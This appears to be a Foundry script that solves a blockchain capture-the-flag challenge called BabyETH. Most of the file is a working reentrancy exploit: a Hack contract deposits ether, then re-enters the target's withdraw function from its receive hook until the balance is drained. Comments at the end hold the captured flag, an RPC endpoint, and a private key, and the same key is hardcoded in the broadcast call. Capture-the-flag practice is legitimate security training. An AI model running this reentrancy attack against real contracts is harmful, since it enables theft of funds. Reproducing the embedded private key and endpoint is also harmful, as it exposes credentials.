// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";
import "../src/Setup.sol";
import "../src/BabyETH.sol";


contract Solution is Script {
    Setup public setup = Setup(0xA50167bA2B18629388B3BB842aCA5bC751E43789);
    address wallet = 0xE4C2259C263577D2d6D96c69e78A0c1E5b8CA1ee;
    BabyETH public babyETH = setup.babyETH();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x4d39231d1a919bfbba77ba6206fb628f7490c4bb60fb4c4065eb5546fecef205);

        Hack hack = new Hack{value: 0.5 ether}(payable(address(babyETH)));
        hack.attack();

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

contract Hack {
    BabyETH public babyETH;

    constructor(address payable chall) payable {
        babyETH = BabyETH(chall);
    }

    function attack() external {
        babyETH.deposit{value: 0.1 ether}();
        babyETH.withdraw(0.1 ether);
    }

    receive() external payable {
        if (address(babyETH).balance >= 0.1 ether) {
            babyETH.withdraw(0.1 ether);
        }
    }
}

// ARKAV{b4by_dUlu_y4k!!f1n4L_4rKaV_b4rU_so4L_bLokc3nG_h4rD}
// Credentials:
// RPC_URL	http://20.195.43.216:8444/096cbe42-3abd-4ea0-b454-933966cbaaca
// PRIVKEY	4d39231d1a919bfbba77ba6206fb628f7490c4bb60fb4c4065eb5546fecef205
// SETUP_CONTRACT_ADDR	0xA50167bA2B18629388B3BB842aCA5bC751E43789
// WALLET_ADDR	0xE4C2259C263577D2d6D96c69e78A0c1E5b8CA1ee